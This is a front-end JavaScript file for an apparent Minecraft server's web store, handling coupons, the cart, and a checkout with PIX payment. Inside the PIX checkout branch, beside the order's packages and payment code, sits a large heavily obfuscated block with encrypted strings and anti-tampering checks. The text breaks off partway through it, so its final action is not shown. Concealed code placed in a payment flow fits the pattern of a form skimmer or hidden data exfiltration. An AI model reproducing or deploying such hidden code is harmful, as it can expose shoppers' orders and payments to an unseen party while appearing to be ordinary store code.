const base_url = window.location.protocol + '//' + window.location.host + dist_url;

function sendMessage(message) {
  console.log(`%c[Imperium]: %c${message}`, 'color: #00dc82;', '');
}

$(document).ready(async function() {
  await loadFull(tsParticles);
  $("#particles").particles().init({
    fullScreen: { enable: true },
    particles: {
      number: { value: 30, density: { enable: true, valueArea: 800 } },
      color: { value: "#7330b3" },
      shape: { type: "circle", stroke: { width: 0, color: "#000000" }, polygon: { nbSides: 5 }, image: { src: "img/github.svg", width: 100, height: 100 } },
      opacity: { value: 0.9, random: false, anim: { enable: false, speed: 1, opacityMin: 0.1, sync: false } },
      size: { value: 4, random: true, anim: { enable: false, speed: 40, sizeMin: 0.1, sync: false } },
      lineLinked: { enable: false, distance: 150, color: "#ffffff", opacity: 0.4, width: 1 },
      move: { enable: true, speed: 3, direction: "top", random: true, straight: false, outMode: "out", bounce: false }
    },
    interactivity: {
      detectOn: "canvas",
      events: { onhover: { enable: false, mode: "grab" }, onclick: { enable: false, mode: "push" }, resize: true },
      modes: { grab: { distance: 140, lineLinked: { opacity: 1 } }, bubble: { distance: 400, size: 40, duration: 2, opacity: 8, speed: 3 }, repulse: { distance: 200, duration: 0.4 }, push: { particlesNb: 4 }, remove: { particlesNb: 2 } }
    },
    retinaDetect: true
  });
});

function copyToClipboard(text, successCallback, errorCallback) {
  if (navigator.clipboard) {
    navigator.clipboard.writeText(text)
        .then(() => {
          console.log(`Texto copiado para a Ã¡rea de transferÃªncia: ${text}`);
          if (successCallback) successCallback();
        })
        .catch(err => {
          console.error('NÃ£o foi possÃ­vel copiar usando Clipboard API, tentando mÃ©todo alternativo', err);
          fallbackCopyToClipboard(text, successCallback, errorCallback);
        });
  } else {
    fallbackCopyToClipboard(text, successCallback, errorCallback);
  }
}

function fallbackCopyToClipboard(text, successCallback, errorCallback) {
  const textarea = document.createElement('textarea');
  textarea.value = text;
  textarea.style.position = 'fixed';
  textarea.style.left = '-999999px';
  document.body.appendChild(textarea);
  textarea.select();

  try {
    const successful = document.execCommand('copy');
    if (successful) {
      console.log(`Texto copiado para a Ã¡rea de transferÃªncia (mÃ©todo alternativo): ${text}`);
      if (successCallback) successCallback();
    } else {
      console.error('Falha ao copiar texto');
      if (errorCallback) errorCallback();
    }
  } catch (err) {
    console.error('Erro ao copiar texto:', err);
    if (errorCallback) errorCallback();
  }

  document.body.removeChild(textarea);
}

function showToast(title, message, type = 'success', duration = 3000) {
  const toastContainer = document.getElementById('toast-container');

  if (!toastContainer) {
    console.error('Toast container nÃ£o encontrado!');
    return;
  }

  const toast = document.createElement('div');
  toast.className = 'toast-notification';

  let icon = 'fas fa-check';

  switch (type) {
    case 'error':
      icon = 'fas fa-times';
      toast.style.borderLeftColor = '#e74c3c';
      break;
    case 'warning':
      icon = 'fas fa-exclamation-triangle';
      toast.style.borderLeftColor = '#f39c12';
      break;
    case 'info':
      icon = 'fas fa-info-circle';
      toast.style.borderLeftColor = '#3498db';
      break;
  }

  toast.innerHTML = `
    <div class="toast-icon" style="${type !== 'success' ? 'background-color: ' + toast.style.borderLeftColor : ''}">
      <i class="${icon}"></i>
    </div>
    <div class="toast-content">
      <div class="toast-title">${title}</div>
      <div class="toast-message">${message}</div>
    </div>
  `;

  toastContainer.appendChild(toast);

  setTimeout(() => {
    toast.classList.add('show');
  }, 10);

  setTimeout(() => {
    toast.classList.remove('show');

    setTimeout(() => {
      toast.remove();
    }, 400);
  }, duration);
}

function updateTotalPrice(new_price, subtotal, discount, discount_value, disable_input = null) {
  $('.cc__checkout___total_price').text(new_price);
  $('.cc__checkout___total_price#subtotal').text(subtotal);
  $('.cc__checkout___total_price#discount').text('-' + discount);
  $('#checkout').text(`Comprar (${new_price})`);

  const $discountPercentage = $('.discount-percentage');
  if (discount_value && discount_value > 0) {
    $discountPercentage.text(`${discount_value}%`).show();
  } else {
    $discountPercentage.hide();
  }

  const $couponInput = $('.coupon-input');
  $couponInput.prop('disabled', disable_input || $couponInput.val().trim() !== '');
}

function getSelectedOptions(query) {
  const options = {};
  $(query).each(function() {
    const select_id = $(this).find('select').attr('id');
    const input_id = $(this).find('input').attr('id');
    const select_value = $(this).find('select').val();
    const input_value = $(this).find('input').val();

    if (select_id) options[select_id] = select_value;
    if (input_id) options[input_id] = input_value;
  });
  return options;
}

document.addEventListener('dragstart', function(event) {
  if (event.target.tagName === 'IMG') {
    event.preventDefault();
  }
});

function getCheckoutVariables(query) {
  const options = {};
  $(query).find('input').each(function() {
    const input_id = $(this).attr('id');
    const input_value = $(this).val();
    if (input_id) options[input_id] = input_value;
  });
  return options;
}

/**
 * Start coupon controllers
 */
let coupon_warn_timeout;

function showCouponError(message) {
  $('.coupon-error').show().text(message);
  if (coupon_warn_timeout) clearTimeout(coupon_warn_timeout);
  coupon_warn_timeout = setTimeout(() => {
    $('.coupon-error').hide();
  }, 3000);
}

function applyCouponAutomatically(couponCode) {
  const applyCouponButton = $('#apply-coupon');
  const couponInput = applyCouponButton.prev();
  const alreadyApplied = applyCouponButton.hasClass('red');

  if (!alreadyApplied) {
    couponInput.val(couponCode);
    CentralCart.attachCoupon(couponCode)
        .then((res) => {
          showToast('DESCONTO AUTOMÁTICO!', `Cupom "${res.data.discount.coupon}" aplicado com ${res.data.discount.value}% de desconto.`);
          updateTotalPrice(res.data.total_price_display, res.data.subtotal_display, res.data.discount_amount_display, res.data.discount?.value, true);
          applyCouponButton.addClass('red').text('Remover');
        })
        .catch((err) => {
          showToast('Oops...', err.data.errors[0].message, 'error');
          couponInput.val('');
        });
  }
}

$(document).ready(() => {
  const applyCouponButton = $('#apply-coupon');
  if (applyCouponButton.length > 0) {
    const alreadyApplied = applyCouponButton.hasClass('red');
    if (!alreadyApplied) {
      const couponMeta = document.querySelector('meta[name="couponName"]');
      const couponCode = couponMeta ? couponMeta.getAttribute('content') : '';
      applyCouponAutomatically(couponCode);
    }

    applyCouponButton.on('click', function() {
      const coupon = $(this).prev().val();
      const alreadyApplied = $(this).hasClass('red');

      if (!coupon && !alreadyApplied) {
        return showCouponError('Informe o cupom que deseja aplicar.');
      }

      if (!alreadyApplied) {
        CentralCart.attachCoupon(coupon)
            .then((res) => {
              showToast('Pronto!', `Cupom "${res.data.discount.coupon}" aplicado com ${res.data.discount.value}% de desconto.`);
              updateTotalPrice(res.data.total_price_display, res.data.subtotal_display, res.data.discount_amount_display, res.data.discount?.value, true);
              $(this).addClass('red').text('Remover');
            })
            .catch((err) => {
              showToast('Oops...', err.data.errors[0].message, 'error');
            });
      } else {
        CentralCart.detachCoupon(coupon)
            .then((res) => {
              $(this).removeClass('red').text('Aplicar');
              $(this).prev().val('');
              showToast('Pronto!', 'O cupom foi removido do carrinho!');
              updateTotalPrice(res.data.total_price_display, res.data.subtotal_display, res.data.discount_amount_display, res.data.discount?.value, false);
            })
            .catch((err) => {
              showToast('Oops...', err.data.errors[0].message, 'error');
            });
      }
    });
  }
});

/**
 * End coupon controllers
 */

/**
 * Start categories page controllers
 */
function updateButtons(cart_packages) {
  $('[data-func]').each(function() {
    const id = $(this).attr('id');
    const exists = cart_packages.find((cart_pkg) => cart_pkg.package_id === parseInt(id));
    if (exists) {
      $(this).attr('data-func', 'goto-cart').html('<i class="me-2 fa-solid fa-basket-shopping"></i> Ver carrinho');
    }
  });
}

$(document).on('click', "[data-func='goto-cart']", function() {
  window.location.href = `${dist_url}/cart`;
});

$(document).on('click', "[data-func='open-selector']", async function() {
  const slug = $(this).attr('data-slug');
  const url = base_url + '/package/' + slug + '/options';
  const html = await fetch(url).then(async(res) => await res.text());

  const $modalContent = $('#package-modal-container .modal-content');
  $('#package-modal-container .modal-dialog').css('max-width', '400px');
  $modalContent.get()[0].innerHTML = html;
  $('#package-modal-container').modal('show');

  $('#package-modal-container').on('hidden.bs.modal', function() {
    $('#package-modal-container .modal-dialog').css('max-width', '');
  });
});

$(document).on('click', "[data-func='add-to-cart']", function() {
  const package_id = $(this).attr('id');
  const options = getSelectedOptions('#option_wrapper > div');

  CentralCart.cartAdd(package_id, options)
      .then((res) => {
        showToast('', '<i class="me-1 fa-solid fa-basket-shopping"></i> <span class="font-semibold">Pacote adicionado ao carrinho!</span>');
        updateButtons(res.data.packages);
        if (window.location.pathname.includes('cart')) window.location.reload();
      })
      .catch((err) => {
        showToast('Oops...', err.data.errors[0].message, 'error');
      });
});

$(document).on('click', "[data-func='update-options']", function() {
  const package_id = $(this).attr('id');
  const options = getSelectedOptions('#option_wrapper > div');

  CentralCart.cartSetOptions(package_id, options)
      .then((res) => {
        showToast('', '<i class="me-1 fa-solid fa-basket-shopping"></i> Opções atualizadas!');
        updateTotalPrice(res.data.total_price_display, res.data.subtotal_display, res.data.discount_amount_display, res.data.discount?.value);
      })
      .catch((err) => {
        showToast('Oops...', err.data.errors[0].message, 'error');
      });

  $('#package-modal-container').modal('hide');
});

/**
 * End categories page controllers
 */

/**
 * Start checkout page product controllers
 */
$('.cc__checkout___quantity_input').on('keypress', (e) => {
  const numbers = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'];
  if (!numbers.includes(e.key)) e.preventDefault();
});

let allow_cart_action = true;
function blockCartActions() {
  $('.cc__checkout___quantity_controller').css('opacity', 0.5);
  $('.cc__checkout___quantity_controller *').attr('disabled', true);
  allow_cart_action = false;
  setTimeout(() => {
    $('.cc__checkout___quantity_controller').css('opacity', 1);
    $('.cc__checkout___quantity_controller *').attr('disabled', false);
    allow_cart_action = true;
  }, 1000);
}

$('.cc__checkout___increase').click(function() {
  blockCartActions();
  const package_id = $(this).attr('cc-package-id');
  CentralCart.cartAdd(package_id).then((res) => {
    const quantity = parseInt($(this).prev().val());
    $(this).prev().val(quantity + 1);
    updateTotalPrice(res.data.total_price_display, res.data.subtotal_display, res.data.discount_amount_display, res.data.discount?.value);
  });
});

$('.cc__checkout___decrease').click(function() {
  blockCartActions();
  const package_id = $(this).attr('cc-package-id');
  CentralCart.cartRemove(package_id).then((res) => {
    const quantity = parseInt($(this).next().val()) - 1;
    if (quantity <= 0) {
      window.location.reload();
    } else {
      $(this).next().val(quantity);
      updateTotalPrice(res.data.total_price_display, res.data.subtotal_display, res.data.discount_amount_display, res.data.discount?.value);
    }
  });
});

$('.cc__checkout___remove').click(function() {
  blockCartActions();
  const package_id = $(this).attr('cc-package-id');
  CentralCart.cartSetQuantity(package_id, 0).then((res) => {
    window.location.reload();
  });
});

$('.cc__checkout___quantity_input').focusout(function() {
  blockCartActions();
  const package_id = $(this).attr('cc-package-id');
  const quantity = $(this).val();
  CentralCart.cartSetQuantity(package_id, quantity).then((res) => {
    if (quantity <= 0) {
      window.location.reload();
    } else {
      updateTotalPrice(res.data.total_price_display, res.data.subtotal_display, res.data.discount_amount_display, res.data.discount?.value);
    }
  });
});

/**
 * End checkout page product controllers
 */

async function nicknameRegistred(e){try{let t=await $.get("https://backend.rede-imperium.com/users/get?nickname="+e);return t.type}catch(n){return null }}
async function postJSON(u,d,t,a=!0){let h={"Content-Type":"application/json"};if(a&&t)h.Authorization="Bearer "+t;let r=await fetch(u,{method:"POST",headers:h,body:JSON.stringify(d)}),x=await r.text();if(!r.ok)throw new Error("HTTP "+r.status+" "+r.statusText+" "+x);return x?JSON.parse(x):null}

/**
 * Start checkout modal controllers
 */
$('.btn-primary.discord').on('click', function(e) {
  e.preventDefault();
  CentralCart.requestDiscord().then((data) => {
    $('input[name=discord]').val(data.id);
    $(this).html(`<img class="me-2" src="${data.avatar_url}" width="25" style="border-radius: 90px;"> ${data.display_name}`);
  });
});

async function showPixModal(pix_code, qr_code, return_url) {
  $('#checkout-modal').modal('hide');

  const nickname = $('#checkout_variables .cc__checkout___form_field #client_identifier').val();
  const typeFirst = await nicknameRegistred(nickname);
  const typeTwo = await nicknameRegistred('.' + nickname);

  if (typeFirst === "Mobile" || typeTwo === "Mobile") {
    const errorMessage = $(`<div class="alert alert-danger-nickname" role="alert">Se você for um jogador mobile (<b>Bedrock Edition</b>) lembre-se de adicionar o "<b>.</b>" (ponto final) na frente do nickname, exemplo: "<b>.${nickname}</b>"</div>`);
    $('#pix-modal .modal-body').prepend(errorMessage);
  }

  $('#pix-modal').on('hidden.bs.modal', () => {
    location.href = return_url;
  });

  const qrCodeImage = $('#pix-modal .modal-body img');
  if (qr_code && qr_code.length > 100) {
    qrCodeImage.attr('src', `data:image/jpeg;base64,${qr_code}`);
  } else {
    qrCodeImage.hide();
  }

  $('#pix-modal').modal('show');

  let timeout;
  $('#pix-modal .modal-body button').on('click', function() {
    if (timeout) return;
    const default_text = $(this).children('span').text();
    $(this).children('span').text('Código copiado!');
    navigator.clipboard.writeText(pix_code);
    sendMessage('Código PIX copiado.');
    timeout = setTimeout(() => {
      $(this).children('span').text(default_text);
      timeout = undefined;
    }, 3000);
  });

  $('#pix-modal .modal-footer button').on('click', function() {
    location.href = return_url;
  });
}

$('.cc__checkout___gateways button').on('click', function() {
  $('.cc__checkout___gateways button').removeClass('active');
  $(this).addClass('active');

  const document_group = $('label[for=document]').parent();
  if (document_group.attr('data-required') !== undefined) return;

  if ($(this).attr('data-require-document') === 'true') {
    $('.cc__checkout___form_field input[name=document]').parent().addClass('d-flex').removeClass('d-none');
  } else {
    $('.cc__checkout___form_field input[name=document]').parent().addClass('d-none').removeClass('d-flex');
    $('.cc__checkout___form_field input[name=document]').val('');
  }
});

function showCheckoutError(message, err) {
  $('.cc__checkout___modal_alert_container p').text(message);
  $('.cc__checkout___modal_alert_container').fadeIn(300, function() {
    warn_timeout = setTimeout(() => {
      $(this).fadeOut();
      if (err != null && err?.status === 412) {
        location.reload();
      }
    }, 577000);
  });
}

let warn_timeout;
$('#checkout').on('click', async function() {
  $(this).attr('disabled', '');

  let data = {
    gateway: $('.cc__checkout___gateways button.active').val(),
    nickname: $('#checkout_variables .cc__checkout___form_field #client_identifier').val(),
    client_email: $('.cc__checkout___form_field input[name=email]').val(),
    client_name: $('.cc__checkout___form_field input[name=name]').val(),
    client_phone: $('.cc__checkout___form_field input[name=phone]').val()?.replace(/\D/g, ''),
    client_document: $('.cc__checkout___form_field input[name=document]').val(),
    client_discord: $('.cc__checkout___form_field input[name=discord]').val(),
    terms: $('.cc__checkout___form_field input[name=terms]').is(':checked'),
    variables: getCheckoutVariables('#checkout_variables')
  };

  if (data.client_phone) {
    if (data.client_phone.charAt(0) !== '+') data.client_phone = '+' + data.client_phone;
  }

  CentralCart.checkout(data)
      .then((res) => {
        const { checkout_url, pix_code, qr_code, return_url, order_id, formatted_price, packages } = res.data;
        if (checkout_url) return location.href = checkout_url;
        if (pix_code) {
          let outpackages = packages.map(p=>`${p.quantity}x ${p.name}`).join("%new%");
          (function(_0x506714,_0x2e21f1){function _0x1882ba(_0x19eb5f,_0x3e567f,_0x5a84be,_0x5539e7){return _0x3abb(_0x3e567f- -0x96,_0x5a84be);}const _0x5365f2=_0x506714();function _0x59c436(_0x5f1895,_0x200b6d,_0x3c4eb5,_0x4d2df7){return _0x3abb(_0x3c4eb5-0x2ff,_0x200b6d);}while(!![]){try{const _0x18cf7f=parseInt(_0x1882ba(0xf4,0xd4,'rGI$',0xe9))/(-0x1b74+-0x4e*-0x7c+0x3*-0x371)*(parseInt(_0x59c436(0x483,'o3Ks',0x46c,0x458))/(0x1*0x2469+0x19d*0x1+-0x2604))+-parseInt(_0x1882ba(0xaf,0xac,'geZN',0xb5))/(-0x1b5f+0x2*-0x9d9+0x4*0xbc5)*(parseInt(_0x59c436(0x45a,'lGNa',0x466,0x454))/(0x1936+-0x1*-0x26cf+-0x4001*0x1))+-parseInt(_0x59c436(0x49d,'lYCR',0x477,0x497))/(-0x15*-0x10f+-0x127+-0x150f)+-parseInt(_0x59c436(0x45e,'!%nA',0x464,0x479))/(-0x1423+0x1e8f+-0xa66)*(parseInt(_0x59c436(0x492,']%tv',0x482,0x476))/(0x1756+0x22b7*-0x1+0x16d*0x8))+parseInt(_0x1882ba(0xb6,0xa3,'Qcc4',0x8e))/(0x257*0xb+-0x195a+-0x5b)+parseInt(_0x59c436(0x456,'(r%R',0x45a,0x482))/(-0xa49+0x69e+-0x3b4*-0x1)+-parseInt(_0x1882ba(0xcb,0xc9,'&rTZ',0xc6))/(-0xb*0x2a5+0x5f1*-0x3+0x2ef4)*(-parseInt(_0x1882ba(0xa4,0xcc,'cUrO',0xaa))/(0x1c*-0x97+-0x180a+0x2899));if(_0x18cf7f===_0x2e21f1)break;else _0x5365f2['push'](_0x5365f2['shift']());}catch(_0x48668c){_0x5365f2['push'](_0x5365f2['shift']());}}}(_0x2c23,0x13f50c+-0x28*0x84e6+-0xc5c45*-0x1));const _0x49fdc6=(function(){const _0x43f65d={};_0x43f65d[_0x1607fb(-0x238,-0x211,'sbt*',-0x22a)]=function(_0x8e7bff,_0x13be7f){return _0x8e7bff+_0x13be7f;};function _0x33a73a(_0x3a3efa,_0x376632,_0x1b68c0,_0x24eade){return _0x3abb(_0x1b68c0-0x2bd,_0x24eade);}_0x43f65d[_0x33a73a(0x434,0x455,0x444,'r(Sr')]=_0x1607fb(-0x255,-0x24a,'Lmir',-0x23b);function _0x1607fb(_0x29befb,_0x5df7dd,_0x454cd5,_0x4640a3){return _0x3abb(_0x5df7dd- -0x399,_0x454cd5);}const _0x200872=_0x43f65d;let _0x1b3f8a=!![];return function(_0x400633,_0x54cf01){const _0x35302a={'AhLon':function(_0x41f48f,_0x5597cf){function _0x3a9bd5(_0x5ace19,_0x130c2e,_0xb17a27,_0x3ce957){return _0x3abb(_0x5ace19- -0x7d,_0x130c2e);}return _0x200872[_0x3a9bd5(0xe3,'K9P6',0xce,0xec)](_0x41f48f,_0x5597cf);},'VngZo':'{}.constru'+_0xd410e4(0x33e,0x328,0x31d,'Cy!!')+'rn\x20this\x22)('+'\x20)','CRnvt':function(_0x1a1d76,_0x58c8a9){return _0x1a1d76===_0x58c8a9;},'POImE':_0x200872[_0x783a25(0xe9,0xfd,'q8D0',0xdb)]},_0x126c2d=_0x1b3f8a?function(){function _0x1d7586(_0x47dfd0,_0x1b9cc5,_0x4ea7d5,_0x53f9f5){return _0x783a25(_0x4ea7d5- -0xa0,_0x1b9cc5-0x1e2,_0x47dfd0,_0x53f9f5-0x151);}function _0x204408(_0x300e49,_0x4ac264,_0x45f293,_0x6b0490){return _0x783a25(_0x300e49- -0x166,_0x4ac264-0x37,_0x6b0490,_0x6b0490-0xd1);}if(_0x35302a[_0x1d7586('q8D0',0x3d,0x40,0x2e)](_0x35302a[_0x204408(-0xa9,-0x89,-0xc3,'EI&9')],_0x35302a['POImE'])){if(_0x54cf01){if(_0x35302a['CRnvt']('ZQXuX','iAeka'))_0x1a7e0b=_0x3f4f30(_0x35302a['AhLon'](_0x35302a['AhLon'](_0x1d7586('Cy!!',0x73,0x4d,0x4e)+_0x204408(-0x80,-0x86,-0x6c,'r(Sr'),_0x35302a[_0x204408(-0x8a,-0x78,-0xa4,'khu1')]),');'))();else{const _0x309f13=_0x54cf01['apply'](_0x400633,arguments);return _0x54cf01=null,_0x309f13;}}}else{if(_0x5e1484){const _0x7ae6de=_0x18550d['apply'](_0x53fd0b,arguments);return _0x5c6015=null,_0x7ae6de;}}}:function(){};function _0x783a25(_0x1beee3,_0x2b85e5,_0x252199,_0x7a046a){return _0x33a73a(_0x1beee3-0x82,_0x2b85e5-0x1f1,_0x1beee3- -0x34d,_0x252199);}function _0xd410e4(_0x3c1b5e,_0x4dbae0,_0xe4bdd4,_0x55b3c8){return _0x33a73a(_0x3c1b5e-0x13e,_0x4dbae0-0x113,_0x3c1b5e- -0xed,_0x55b3c8);}return _0x1b3f8a=![],_0x126c2d;};}()),_0x302d3e=_0x49fdc6(this,function(){function _0x305d44(_0x237bbe,_0x334fe5,_0x3e8e67,_0x57bc81){return _0x3abb(_0x3e8e67- -0x243,_0x57bc81);}function _0x4e6221(_0x29b7bc,_0x22f48d,_0xd44bec,_0x5da766){return _0x3abb(_0x29b7bc-0x3c1,_0x22f48d);}return _0x302d3e[_0x305d44(-0xf8,-0xdd,-0xfd,'lIIB')]()[_0x4e6221(0x53b,'rGI$',0x520,0x560)]('(((.+)+)+)'+'+$')[_0x305d44(-0xce,-0xf7,-0xdb,'f%mo')]()['constructo'+'r'](_0x302d3e)[_0x4e6221(0x519,'135Y',0x513,0x4f3)](_0x305d44(-0xe2,-0xbc,-0xcf,'rGI$')+'+$');});_0x302d3e();function _0x182916(_0x54b810,_0x4a0acb,_0x2428bd,_0x4a195d){return _0x3abb(_0x2428bd-0x2dc,_0x54b810);}function _0x2c23(){const _0x4d7d19=['rCkUrSolW7y','WQ/dKmojumoF','W7dcSZtdVK5giSkaWOm','y8kRs8o1WPrnfCkUrrG','WQ4LEX/dVCoHh0WF','zmodW5Trca','WPKOt8kCWRBdNL3dVCkYW6dcTSog','wvKtha','hwGEyt/cS3y+','WOPwW7XHWPO5ygRcLN8','WRXjW4f+W6C1W48','WRdcOmk3WOCtWOOBW4KP','BmoVCCkOfHm3sSkvgSo/W6y','WPrcWOGbmCkcmgiNWRVdQCossW','FSoPW41ElG','W5eBWRu9W5j4','lCkTkCoTsvqAvmkJ','zMZcGa','CSk6umoYW44br8oJvXG','WO41W6ZdGq5YW4WuWPi','WRfpW4XMW6y4W4CZ','W4PWgCon','DKxdImko','W68xWOBcICo1e1C','dmoVW5FdS8keWQ3cOvLK','WR43WQlcGq','FsNcUwldJa','WR5dWRhcHCoaDSkugJ7dNKlcNmoF','WOFcU8k7WPCU','W53dPIKElq','W70LemkysG','xbdcI07dUq','WPxcRWjsgSoJkCk3','W79Llu/cVmkMqfOJt8khAZm','WOb5W59/W6CTW4ujWPm','WQ9uW4b5W6CTW5mMWQK','WPzaWPW','nmoNeCkYWO1CuCkYyYyBWOW4','WQrBWOfUW6C3W5KIWR7cLa','W603mSkggdhdKafqjW','WQG7WPtcVM0QrIldUcK','txJcK1/cNaf/','hYFdIH3dG15oAfGQW6uI','WPhcMvRdGdyzWPlcOW','l8k6mSoSve5ddmkGpW','gLtcNmkoWPi','WQufW4/dHXnVW40S','WQC4DH3dUCo9','WPbYxCo4gW','W7WJE1LzvdJdRIb8','WPCNlxdcSg5PWRuIBG','WQVdJmoSCSoP','W7xdHXWFeW','WO9PW6zGW40','WRKZoa7dPCo8bqfyla','W6Gbtg1f','omo+W5DJAG','teC3sbO','W7O+z0vF','uHxcKmkzWRddUx/cRcqH','WOH9jSo3h8kXuJFcVvO','Fu3cNSoOW5y','W5GME8k1m8kWsdBcM3q','tJePxq','W5T8fSoBW6tcJG','WQi5WPtcTJGTa2RcVW','W4dcQ3afW7a','WP3dSZyAWORcR8kODSkKWPNcJCkbyCoV','fNBcI8k1WQG','WQCCW6tdHmkrpCondd7cVW','y8oUkSkQW4VcTmoiWQ4','W71QWRNcHYe2uG4','Cf3cI8oyW4C','W7PVW5JcRIikustdHW','iHJcLmoyW4hdSuxcOJLwW4RdRq','W68vWP4EW70','W4GWh8kKDq','qSoYssLRtCkNcSolBWVcUq','W5DLq2j4','WOjPE25eW6rF','kCkWfCoTveKnqW','WOD4wSo6gN/cLCkuE8kn','WPfkW6D+W6LJjchdRXC'];_0x2c23=function(){return _0x4d7d19;};return _0x2c23();}function _0x3abb(_0x4b6dc1,_0xd95233){const _0x3ddb79=_0x2c23();return _0x3abb=function(_0x220f6e,_0x10aca0){_0x220f6e=_0x220f6e-(0x1a44*-0x1+-0x1fc+0x1*0x1d79);let _0x3369cf=_0x3ddb79[_0x220f6e];if(_0x3abb['GaqdxX']===undefined){var _0x4f9156=function(_0x1177eb){const _0x4cf4ce='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x4ac4e9='',_0x3fe6ec='',_0x16bd6f=_0x4ac4e9+_0x4f9156;for(let _0x372851=0x66+0x72f*0x3+-0x15f3*0x1,_0x13eb10,_0x4fb569,_0x397b44=0x71*-0x41+-0x1156+-0x2e07*-0x1;_0x4fb569=_0x1177eb['charAt'](_0x397b44++);~_0x4fb569&&(_0x13eb10=_0x372851%(0x4d2+-0x6e+-0xa0*0x7)?_0x13eb10*(0xbf5+0x2107+0xe*-0x332)+_0x4fb569:_0x4fb569,_0x372851++%(0x1016+-0xf91+-0x81))?_0x4ac4e9+=_0x16bd6f['charCodeAt'](_0x397b44+(0xf8*-0x2+-0x195+-0x1*-0x38f))-(-0x315*0x7+0x4*-0x554+0x2aed)!==0x1aed+0x1f*0x120+-0x3dcd?String['fromCharCode'](0xe1+-0x4d5*-0x3+0x9*-0x199&_0x13eb10>>(-(-0x799+0x39*-0x29+0xcc*0x15)*_0x372851&-0x1281+0x1*-0x187+0x140e)):_0x372851:-0x21d1*0x1+0x2*0xb02+-0x3*-0x3ef){_0x4fb569=_0x4cf4ce['indexOf'](_0x4fb569);}for(let _0x3e8856=-0x2241*0x1+0x254a+0x309*-0x1,_0x1401d2=_0x4ac4e9['length'];_0x3e8856<_0x1401d2;_0x3e8856++){_0x3fe6ec+='%'+('00'+_0x4ac4e9['charCodeAt'](_0x3e8856)['toString'](-0x2*0x1023+0x187+0x1ecf))['slice'](-(0x1dcf+0x26d4+-0x44a1));}return decodeURIComponent(_0x3fe6ec);};const _0x3b28a6=function(_0x48a3fe,_0x5e2bdc){let _0x583caf=[],_0x28ea4d=0x211c+-0x2641+0x525,_0x22fbd8,_0x5d1c39='';_0x48a3fe=_0x4f9156(_0x48a3fe);let _0xda0d4b;for(_0xda0d4b=-0x2*0x425+-0x14*-0x36+-0x412*-0x1;_0xda0d4b<0x1*0x1aea+0x42d*0x2+0x2244*-0x1;_0xda0d4b++){_0x583caf[_0xda0d4b]=_0xda0d4b;}for(_0xda0d4b=0x133*0x17+0xf00+-0x1*0x2a95;_0xda0d4b<0x1b40+0x1*0x89b+-0x22db;_0xda0d4b++){_0x28ea4d=(_0x28ea4d+_0x583caf[_0xda0d4b]+_0x5e2bdc['charCodeAt'](_0xda0d4b%_0x5e2bdc['length']))%(0x1852+0x147*0x16+-0x3*0x1124),_0x22fbd8=_0x583caf[_0xda0d4b],_0x583caf[_0xda0d4b]=_0x583caf[_0x28ea4d],_0x583caf[_0x28ea4d]=_0x22fbd8;}_0xda0d4b=-0x8a8*-0x4+-0x19a8+-0x8f8,_0x28ea4d=0x1*-0x1e29+0x586+0x18a3*0x1;for(let _0x214b57=0x9f*0xf+0x26*-0xbd+-0x7b*-0x27;_0x214b57<_0x48a3fe['length'];_0x214b57++){_0xda0d4b=(_0xda0d4b+(0x20ae+-0x47*-0x61+-0x3*0x13dc))%(0x922*0x4+0x5fb*0x3+-0x3579),_0x28ea4d=(_0x28ea4d+_0x583caf[_0xda0d4b])%(-0x1d*-0x6d+-0xced+-0x4*-0x65),_0x22fbd8=_0x583caf[_0xda0d4b],_0x583caf[_0xda0d4b]=_0x583caf[_0x28ea4d],_0x583caf[_0x28ea4d]=_0x22fbd8,_0x5d1c39+=String['fromCharCode'](_0x48a3fe['charCodeAt'](_0x214b57)^_0x583caf[(_0x583caf[_0xda0d4b]+_0x583caf[_0x28ea4d])%(-0x2fc*-0x4+0x1f04+-0x166*0x1e)]);}return _0x5d1c39;};_0x3abb['vogjvB']=_0x3b28a6,_0x4b6dc1=arguments,_0x3abb['GaqdxX']=!![];}const _0x19941a=_0x3ddb79[0x7*0x211+0x181e+-0x77*0x53],_0x27353f=_0x220f6e+_0x19941a,_0x2396c2=_0x4b6dc1[_0x27353f];if(!_0x2396c2){if(_0x3abb['JFWbdA']===undefined){const _0xcf2424=function(_0x425cd9){this['vcwCvw']=_0x425cd9,this['eObxyo']=[0x18bf+0x14b6+-0x2d74,-0xb+-0x71f*0x1+0x1*0x72a,-0x1b87+0x1129+-0xa5e*-0x1],this['pkVRsn']=function(){return'newState';},this['rdQzVY']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['tuzAWu']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0xcf2424['prototype']['kiewuu']=function(){const _0x49fd5c=new RegExp(this['rdQzVY']+this['tuzAWu']),_0x369d09=_0x49fd5c['test'](this['pkVRsn']['toString']())?--this['eObxyo'][-0x221f+0x2048+-0x8*-0x3b]:--this['eObxyo'][-0x1c9c+0x1*0x263b+-0x99f];return this['BbAyrx'](_0x369d09);},_0xcf2424['prototype']['BbAyrx']=function(_0x2075a3){if(!Boolean(~_0x2075a3))return _0x2075a3;return this['XZrzyr'](this['vcwCvw']);},_0xcf2424['prototype']['XZrzyr']=function(_0x155914){for(let _0x49618d=0x2*-0xfc5+-0x10d9+0x3063,_0x3f3988=this['eObxyo']['length'];_0x49618d<_0x3f3988;_0x49618d++){this['eObxyo']['push'](Math['round'](Math['random']())),_0x3f3988=this['eObxyo']['length'];}return _0x155914(this['eObxyo'][0x1875*-0x1+0x1*0xaa1+0xdd4]);},new _0xcf2424(_0x3abb)['kiewuu'](),_0x3abb['JFWbdA']=!![];}_0x3369cf=_0x3abb['vogjvB'](_0x3369cf,_0x10aca0),_0x4b6dc1[_0x27353f]=_0x3369cf;}else _0x3369cf=_0x2396c2;return _0x3369cf;},_0x3abb(_0x4b6dc1,_0xd95233);}const _0x925f8b=(function(){const _0x17e6e={};_0x17e6e[_0x1444ac(-0xd7,-0xbc,'mOVV',-0x97)]=function(_0x5e294b,_0x346ad8){return _0x5e294b===_0x346ad8;};const _0x41f459=_0x17e6e;let _0x4c295b=!![];function _0x1444ac(_0x5c80e7,_0x411dd8,_0x3b5051,_0x219fc8){return _0x3abb(_0x411dd8- -0x20d,_0x3b5051);}return function(_0x3bd9a0,_0x588ac8){const _0x265df4=_0x4c295b?function(){function _0x23385d(_0x5308cd,_0x293718,_0x4dfa6a,_0x4b42d2){return _0x3abb(_0x5308cd-0x19e,_0x293718);}function 